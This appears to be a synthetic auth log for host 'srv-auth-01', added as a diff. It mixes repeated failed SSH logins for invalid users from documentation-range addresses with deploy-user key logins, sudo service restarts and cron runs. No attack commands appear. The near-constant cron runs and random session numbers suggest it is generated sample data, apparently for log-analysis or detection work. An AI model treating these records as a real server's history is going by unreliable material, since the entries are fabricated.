+2026-11-05 01:12:21 srv-auth-01 systemd[1]: Started Session 519 of user deploy.
+2026-11-05 01:12:22 srv-auth-01 CRON[2475]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:23 srv-auth-01 sshd[9281]: Failed password for invalid user pi from 203.0.113.249 port 37888 ssh2
+2026-11-05 01:12:24 srv-auth-01 sshd[6781]: Accepted publickey for deploy from 10.0.0.14 port 39219 ssh2
+2026-11-05 01:12:25 srv-auth-01 sshd[8710]: Failed password for invalid user oracle from 203.0.113.139 port 30267 ssh2
+2026-11-05 01:12:26 srv-auth-01 CRON[8060]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:27 srv-auth-01 sshd[5333]: Accepted publickey for deploy from 10.0.5.197 port 43213 ssh2
+2026-11-05 01:12:28 srv-auth-01 systemd[1]: Started Session 56 of user deploy.
+2026-11-05 01:12:29 srv-auth-01 sshd[1838]: Failed password for invalid user test from 203.0.113.94 port 48128 ssh2
+2026-11-05 01:12:30 srv-auth-01 systemd[1]: Started Session 85 of user deploy.
+2026-11-05 01:12:31 srv-auth-01 sshd[9261]: Failed password for invalid user pi from 203.0.113.197 port 48017 ssh2
+2026-11-05 01:12:32 srv-auth-01 systemd[1]: Started Session 855 of user deploy.
+2026-11-05 01:12:33 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:34 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:35 srv-auth-01 sshd[2584]: Accepted publickey for deploy from 10.0.6.97 port 56047 ssh2
+2026-11-05 01:12:36 srv-auth-01 systemd[1]: Started Session 581 of user deploy.
+2026-11-05 01:12:37 srv-auth-01 systemd[1]: Started Session 783 of user deploy.
+2026-11-05 01:12:38 srv-auth-01 sshd[4261]: Accepted publickey for deploy from 10.0.9.132 port 43152 ssh2
+2026-11-05 01:12:39 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:40 srv-auth-01 CRON[1637]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:41 srv-auth-01 sshd[6456]: Accepted publickey for deploy from 10.0.7.134 port 44974 ssh2
+2026-11-05 01:12:42 srv-auth-01 sshd[9446]: Accepted publickey for deploy from 10.0.2.85 port 50089 ssh2
+2026-11-05 01:12:43 srv-auth-01 systemd[1]: Started Session 176 of user deploy.
+2026-11-05 01:12:44 srv-auth-01 sshd[5902]: Failed password for invalid user oracle from 203.0.113.131 port 57141 ssh2
+2026-11-05 01:12:45 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:46 srv-auth-01 sshd[5911]: Failed password for invalid user pi from 203.0.113.210 port 30545 ssh2
+2026-11-05 01:12:47 srv-auth-01 systemd[1]: Started Session 349 of user deploy.
+2026-11-05 01:12:48 srv-auth-01 CRON[7824]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:49 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:50 srv-auth-01 CRON[8775]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:51 srv-auth-01 systemd[1]: Started Session 681 of user deploy.
+2026-11-05 01:12:52 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:53 srv-auth-01 sshd[1841]: Accepted publickey for deploy from 10.0.9.124 port 35587 ssh2
+2026-11-05 01:12:54 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:55 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:12:56 srv-auth-01 sshd[4968]: Accepted publickey for deploy from 10.0.0.148 port 52954 ssh2
+2026-11-05 01:12:57 srv-auth-01 CRON[4125]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:58 srv-auth-01 CRON[8225]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:12:59 srv-auth-01 systemd[1]: Started Session 438 of user deploy.
+2026-11-05 01:13:00 srv-auth-01 sshd[7765]: Accepted publickey for deploy from 10.0.3.107 port 46443 ssh2
+2026-11-05 01:13:01 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:02 srv-auth-01 CRON[3262]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:03 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:04 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:05 srv-auth-01 sshd[9609]: Failed password for invalid user pi from 203.0.113.82 port 35674 ssh2
+2026-11-05 01:13:06 srv-auth-01 sshd[9734]: Failed password for invalid user oracle from 203.0.113.141 port 41609 ssh2
+2026-11-05 01:13:07 srv-auth-01 systemd[1]: Started Session 634 of user deploy.
+2026-11-05 01:13:08 srv-auth-01 sshd[4150]: Failed password for invalid user test from 203.0.113.73 port 48287 ssh2
+2026-11-05 01:13:09 srv-auth-01 systemd[1]: Started Session 240 of user deploy.
+2026-11-05 01:13:10 srv-auth-01 systemd[1]: Started Session 799 of user deploy.
+2026-11-05 01:13:11 srv-auth-01 systemd[1]: Started Session 731 of user deploy.
+2026-11-05 01:13:12 srv-auth-01 sshd[9011]: Accepted publickey for deploy from 10.0.5.124 port 41429 ssh2
+2026-11-05 01:13:13 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:14 srv-auth-01 systemd[1]: Started Session 304 of user deploy.
+2026-11-05 01:13:15 srv-auth-01 CRON[9899]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:16 srv-auth-01 sshd[7464]: Failed password for invalid user oracle from 203.0.113.246 port 55331 ssh2
+2026-11-05 01:13:17 srv-auth-01 sshd[5758]: Accepted publickey for deploy from 10.0.0.75 port 53400 ssh2
+2026-11-05 01:13:18 srv-auth-01 CRON[6674]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:19 srv-auth-01 sshd[5201]: Failed password for invalid user pi from 203.0.113.56 port 36621 ssh2
+2026-11-05 01:13:20 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:21 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:22 srv-auth-01 systemd[1]: Started Session 150 of user deploy.
+2026-11-05 01:13:23 srv-auth-01 CRON[4920]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:24 srv-auth-01 sshd[1831]: Accepted publickey for deploy from 10.0.8.59 port 50904 ssh2
+2026-11-05 01:13:25 srv-auth-01 sshd[1860]: Accepted publickey for deploy from 10.0.1.107 port 40823 ssh2
+2026-11-05 01:13:26 srv-auth-01 sshd[2647]: Failed password for invalid user test from 203.0.113.3 port 48033 ssh2
+2026-11-05 01:13:27 srv-auth-01 sshd[7666]: Accepted publickey for deploy from 10.0.7.124 port 51316 ssh2
+2026-11-05 01:13:28 srv-auth-01 sshd[5706]: Accepted publickey for deploy from 10.0.5.75 port 51164 ssh2
+2026-11-05 01:13:29 srv-auth-01 CRON[2465]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:30 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:31 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:32 srv-auth-01 CRON[3868]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:33 srv-auth-01 sshd[3880]: Failed password for invalid user admin from 203.0.113.216 port 43008 ssh2
+2026-11-05 01:13:34 srv-auth-01 sshd[4052]: Failed password for invalid user oracle from 203.0.113.226 port 31227 ssh2
+2026-11-05 01:13:35 srv-auth-01 CRON[5888]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:36 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:37 srv-auth-01 CRON[6489]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:38 srv-auth-01 systemd[1]: Started Session 475 of user deploy.
+2026-11-05 01:13:39 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:40 srv-auth-01 sshd[3198]: Failed password for invalid user pi from 203.0.113.71 port 36318 ssh2
+2026-11-05 01:13:41 srv-auth-01 CRON[6417]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:42 srv-auth-01 sshd[8518]: Accepted publickey for deploy from 10.0.4.185 port 36101 ssh2
+2026-11-05 01:13:43 srv-auth-01 CRON[6523]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:44 srv-auth-01 systemd[1]: Started Session 591 of user deploy.
+2026-11-05 01:13:45 srv-auth-01 sshd[3875]: Accepted publickey for deploy from 10.0.9.221 port 50929 ssh2
+2026-11-05 01:13:46 srv-auth-01 sshd[8007]: Failed password for invalid user oracle from 203.0.113.24 port 43134 ssh2
+2026-11-05 01:13:47 srv-auth-01 CRON[4027]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:48 srv-auth-01 sshd[8822]: Accepted publickey for deploy from 10.0.5.241 port 38128 ssh2
+2026-11-05 01:13:49 srv-auth-01 CRON[5272]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:13:50 srv-auth-01 sshd[4858]: Failed password for invalid user pi from 203.0.113.194 port 38748 ssh2
+2026-11-05 01:13:51 srv-auth-01 systemd[1]: Started Session 319 of user deploy.
+2026-11-05 01:13:52 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:53 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:13:54 srv-auth-01 systemd[1]: Started Session 679 of user deploy.
+2026-11-05 01:13:55 srv-auth-01 systemd[1]: Started Session 719 of user deploy.
+2026-11-05 01:13:56 srv-auth-01 sshd[2017]: Accepted publickey for deploy from 10.0.1.121 port 40053 ssh2
+2026-11-05 01:13:57 srv-auth-01 sshd[7642]: Accepted publickey for deploy from 10.0.8.238 port 59331 ssh2
+2026-11-05 01:13:58 srv-auth-01 systemd[1]: Started Session 716 of user deploy.
+2026-11-05 01:13:59 srv-auth-01 CRON[5833]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:00 srv-auth-01 systemd[1]: Started Session 639 of user deploy.
+2026-11-05 01:14:01 srv-auth-01 sshd[4590]: Accepted publickey for deploy from 10.0.2.124 port 35019 ssh2
+2026-11-05 01:14:02 srv-auth-01 sshd[7121]: Failed password for invalid user pi from 203.0.113.181 port 47997 ssh2
+2026-11-05 01:14:03 srv-auth-01 sshd[9806]: Failed password for invalid user test from 203.0.113.197 port 38108 ssh2
+2026-11-05 01:14:04 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:05 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:06 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:07 srv-auth-01 systemd[1]: Started Session 89 of user deploy.
+2026-11-05 01:14:08 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:09 srv-auth-01 CRON[9972]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:10 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:11 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:12 srv-auth-01 sshd[3695]: Accepted publickey for deploy from 10.0.5.220 port 47050 ssh2
+2026-11-05 01:14:13 srv-auth-01 sshd[2904]: Failed password for invalid user test from 203.0.113.185 port 49108 ssh2
+2026-11-05 01:14:14 srv-auth-01 sshd[2489]: Failed password for invalid user pi from 203.0.113.209 port 31823 ssh2
+2026-11-05 01:14:15 srv-auth-01 sshd[3161]: Failed password for invalid user pi from 203.0.113.118 port 48478 ssh2
+2026-11-05 01:14:16 srv-auth-01 CRON[8575]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:17 srv-auth-01 systemd[1]: Started Session 750 of user deploy.
+2026-11-05 01:14:18 srv-auth-01 CRON[7487]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:19 srv-auth-01 systemd[1]: Started Session 846 of user deploy.
+2026-11-05 01:14:20 srv-auth-01 CRON[4570]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:21 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:22 srv-auth-01 CRON[7941]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:23 srv-auth-01 systemd[1]: Started Session 727 of user deploy.
+2026-11-05 01:14:24 srv-auth-01 CRON[9866]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:25 srv-auth-01 CRON[2130]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:26 srv-auth-01 sshd[1519]: Failed password for invalid user oracle from 203.0.113.106 port 35897 ssh2
+2026-11-05 01:14:27 srv-auth-01 sshd[7887]: Accepted publickey for deploy from 10.0.5.230 port 42533 ssh2
+2026-11-05 01:14:28 srv-auth-01 sshd[7184]: Failed password for invalid user pi from 203.0.113.22 port 52371 ssh2
+2026-11-05 01:14:29 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:30 srv-auth-01 systemd[1]: Started Session 131 of user deploy.
+2026-11-05 01:14:31 srv-auth-01 sshd[9802]: Accepted publickey for deploy from 10.0.6.137 port 34172 ssh2
+2026-11-05 01:14:32 srv-auth-01 sshd[1056]: Accepted publickey for deploy from 10.0.0.78 port 45171 ssh2
+2026-11-05 01:14:33 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:34 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:35 srv-auth-01 sshd[5055]: Accepted publickey for deploy from 10.0.7.90 port 35083 ssh2
+2026-11-05 01:14:36 srv-auth-01 systemd[1]: Started Session 203 of user deploy.
+2026-11-05 01:14:37 srv-auth-01 CRON[1527]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:38 srv-auth-01 sshd[1256]: Failed password for invalid user test from 203.0.113.54 port 32204 ssh2
+2026-11-05 01:14:39 srv-auth-01 CRON[1550]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:40 srv-auth-01 sshd[1797]: Failed password for invalid user test from 203.0.113.191 port 31449 ssh2
+2026-11-05 01:14:41 srv-auth-01 sshd[8191]: Failed password for invalid user test from 203.0.113.140 port 37119 ssh2
+2026-11-05 01:14:42 srv-auth-01 CRON[3295]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:14:43 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:44 srv-auth-01 sshd[6224]: Accepted publickey for deploy from 10.0.9.155 port 55314 ssh2
+2026-11-05 01:14:45 srv-auth-01 systemd[1]: Started Session 252 of user deploy.
+2026-11-05 01:14:46 srv-auth-01 systemd[1]: Started Session 907 of user deploy.
+2026-11-05 01:14:47 srv-auth-01 sshd[9540]: Accepted publickey for deploy from 10.0.3.107 port 39846 ssh2
+2026-11-05 01:14:48 srv-auth-01 systemd[1]: Started Session 72 of user deploy.
+2026-11-05 01:14:49 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:50 srv-auth-01 sshd[7999]: Accepted publickey for deploy from 10.0.8.128 port 31536 ssh2
+2026-11-05 01:14:51 srv-auth-01 systemd[1]: Started Session 974 of user deploy.
+2026-11-05 01:14:52 srv-auth-01 sshd[9592]: Failed password for invalid user oracle from 203.0.113.180 port 43642 ssh2
+2026-11-05 01:14:53 srv-auth-01 sshd[3444]: Failed password for invalid user oracle from 203.0.113.98 port 36025 ssh2
+2026-11-05 01:14:54 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:14:55 srv-auth-01 sshd[4692]: Accepted publickey for deploy from 10.0.4.221 port 53185 ssh2
+2026-11-05 01:14:56 srv-auth-01 sshd[8586]: Accepted publickey for deploy from 10.0.0.145 port 43522 ssh2
+2026-11-05 01:14:57 srv-auth-01 sshd[9683]: Failed password for invalid user test from 203.0.113.101 port 37957 ssh2
+2026-11-05 01:14:58 srv-auth-01 systemd[1]: Started Session 218 of user deploy.
+2026-11-05 01:14:59 srv-auth-01 systemd[1]: Started Session 672 of user deploy.
+2026-11-05 01:15:00 srv-auth-01 CRON[8369]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:01 srv-auth-01 systemd[1]: Started Session 104 of user deploy.
+2026-11-05 01:15:02 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:03 srv-auth-01 sshd[1844]: Accepted publickey for deploy from 10.0.4.98 port 52074 ssh2
+2026-11-05 01:15:04 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:05 srv-auth-01 CRON[2192]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:06 srv-auth-01 sshd[4555]: Accepted publickey for deploy from 10.0.7.55 port 58490 ssh2
+2026-11-05 01:15:07 srv-auth-01 systemd[1]: Started Session 320 of user deploy.
+2026-11-05 01:15:08 srv-auth-01 CRON[4470]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:09 srv-auth-01 sshd[2922]: Accepted publickey for deploy from 10.0.7.236 port 37949 ssh2
+2026-11-05 01:15:10 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:11 srv-auth-01 sshd[7498]: Accepted publickey for deploy from 10.0.3.143 port 40538 ssh2
+2026-11-05 01:15:12 srv-auth-01 systemd[1]: Started Session 399 of user deploy.
+2026-11-05 01:15:13 srv-auth-01 sshd[9743]: Failed password for invalid user oracle from 203.0.113.80 port 38570 ssh2
+2026-11-05 01:15:14 srv-auth-01 systemd[1]: Started Session 535 of user deploy.
+2026-11-05 01:15:15 srv-auth-01 sshd[8635]: Failed password for invalid user admin from 203.0.113.207 port 53672 ssh2
+2026-11-05 01:15:16 srv-auth-01 sshd[6246]: Failed password for invalid user test from 203.0.113.96 port 40253 ssh2
+2026-11-05 01:15:17 srv-auth-01 sshd[1749]: Failed password for invalid user test from 203.0.113.191 port 34781 ssh2
+2026-11-05 01:15:18 srv-auth-01 CRON[5272]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:19 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:20 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:21 srv-auth-01 sshd[5836]: Failed password for invalid user test from 203.0.113.52 port 40809 ssh2
+2026-11-05 01:15:22 srv-auth-01 sshd[7223]: Accepted publickey for deploy from 10.0.9.215 port 38052 ssh2
+2026-11-05 01:15:23 srv-auth-01 sshd[6530]: Failed password for invalid user oracle from 203.0.113.197 port 56921 ssh2
+2026-11-05 01:15:24 srv-auth-01 sshd[9037]: Failed password for invalid user pi from 203.0.113.45 port 54011 ssh2
+2026-11-05 01:15:25 srv-auth-01 systemd[1]: Started Session 183 of user deploy.
+2026-11-05 01:15:26 srv-auth-01 sshd[9954]: Accepted publickey for deploy from 10.0.7.49 port 59142 ssh2
+2026-11-05 01:15:27 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:28 srv-auth-01 CRON[9584]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:29 srv-auth-01 CRON[2217]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:30 srv-auth-01 CRON[1104]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:31 srv-auth-01 sshd[3252]: Failed password for invalid user test from 203.0.113.19 port 53172 ssh2
+2026-11-05 01:15:32 srv-auth-01 sshd[1149]: Accepted publickey for deploy from 10.0.3.131 port 44942 ssh2
+2026-11-05 01:15:33 srv-auth-01 systemd[1]: Started Session 71 of user deploy.
+2026-11-05 01:15:34 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:35 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:36 srv-auth-01 sshd[1257]: Failed password for invalid user admin from 203.0.113.138 port 48076 ssh2
+2026-11-05 01:15:37 srv-auth-01 sshd[1194]: Failed password for invalid user admin from 203.0.113.137 port 53664 ssh2
+2026-11-05 01:15:38 srv-auth-01 systemd[1]: Started Session 558 of user deploy.
+2026-11-05 01:15:39 srv-auth-01 systemd[1]: Started Session 27 of user deploy.
+2026-11-05 01:15:40 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:41 srv-auth-01 sshd[3937]: Failed password for invalid user admin from 203.0.113.237 port 33156 ssh2
+2026-11-05 01:15:42 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:43 srv-auth-01 sshd[4144]: Accepted publickey for deploy from 10.0.9.136 port 38271 ssh2
+2026-11-05 01:15:44 srv-auth-01 systemd[1]: Started Session 283 of user deploy.
+2026-11-05 01:15:45 srv-auth-01 sshd[2294]: Failed password for invalid user oracle from 203.0.113.247 port 43304 ssh2
+2026-11-05 01:15:46 srv-auth-01 sshd[4984]: Failed password for invalid user test from 203.0.113.78 port 52414 ssh2
+2026-11-05 01:15:47 srv-auth-01 CRON[1519]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:48 srv-auth-01 CRON[7640]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:49 srv-auth-01 sshd[7179]: Failed password for invalid user pi from 203.0.113.16 port 50864 ssh2
+2026-11-05 01:15:50 srv-auth-01 CRON[3807]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:51 srv-auth-01 CRON[9189]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:52 srv-auth-01 sshd[6427]: Failed password for invalid user admin from 203.0.113.231 port 47306 ssh2
+2026-11-05 01:15:53 srv-auth-01 CRON[4764]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:54 srv-auth-01 sshd[8790]: Accepted publickey for deploy from 10.0.4.13 port 32436 ssh2
+2026-11-05 01:15:55 srv-auth-01 systemd[1]: Started Session 930 of user deploy.
+2026-11-05 01:15:56 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:15:57 srv-auth-01 CRON[3938]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:15:58 srv-auth-01 systemd[1]: Started Session 26 of user deploy.
+2026-11-05 01:15:59 srv-auth-01 sshd[3362]: Accepted publickey for deploy from 10.0.6.239 port 32521 ssh2
+2026-11-05 01:16:00 srv-auth-01 systemd[1]: Started Session 176 of user deploy.
+2026-11-05 01:16:01 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:02 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:03 srv-auth-01 sudo: deploy : TTY=pts/2 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:04 srv-auth-01 sshd[3292]: Failed password for invalid user admin from 203.0.113.130 port 54427 ssh2
+2026-11-05 01:16:05 srv-auth-01 systemd[1]: Started Session 64 of user deploy.
+2026-11-05 01:16:06 srv-auth-01 CRON[8161]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:07 srv-auth-01 sshd[2245]: Accepted publickey for deploy from 10.0.5.156 port 55198 ssh2
+2026-11-05 01:16:08 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:09 srv-auth-01 sshd[6347]: Failed password for invalid user admin from 203.0.113.164 port 38956 ssh2
+2026-11-05 01:16:10 srv-auth-01 sshd[9038]: Failed password for invalid user test from 203.0.113.93 port 48121 ssh2
+2026-11-05 01:16:11 srv-auth-01 sshd[8075]: Failed password for invalid user test from 203.0.113.176 port 49197 ssh2
+2026-11-05 01:16:12 srv-auth-01 sshd[2404]: Failed password for invalid user oracle from 203.0.113.206 port 38075 ssh2
+2026-11-05 01:16:13 srv-auth-01 CRON[2344]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:14 srv-auth-01 systemd[1]: Started Session 167 of user deploy.
+2026-11-05 01:16:15 srv-auth-01 sshd[3527]: Failed password for invalid user pi from 203.0.113.83 port 41819 ssh2
+2026-11-05 01:16:16 srv-auth-01 CRON[2499]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:17 srv-auth-01 CRON[6050]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:18 srv-auth-01 sshd[6896]: Failed password for invalid user oracle from 203.0.113.28 port 34341 ssh2
+2026-11-05 01:16:19 srv-auth-01 CRON[4070]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:20 srv-auth-01 sshd[8353]: Failed password for invalid user pi from 203.0.113.28 port 30860 ssh2
+2026-11-05 01:16:21 srv-auth-01 CRON[6798]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:22 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:23 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:24 srv-auth-01 systemd[1]: Started Session 894 of user deploy.
+2026-11-05 01:16:25 srv-auth-01 sshd[1202]: Failed password for invalid user oracle from 203.0.113.107 port 42707 ssh2
+2026-11-05 01:16:26 srv-auth-01 CRON[4977]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:27 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:28 srv-auth-01 sshd[7237]: Accepted publickey for deploy from 10.0.2.37 port 38811 ssh2
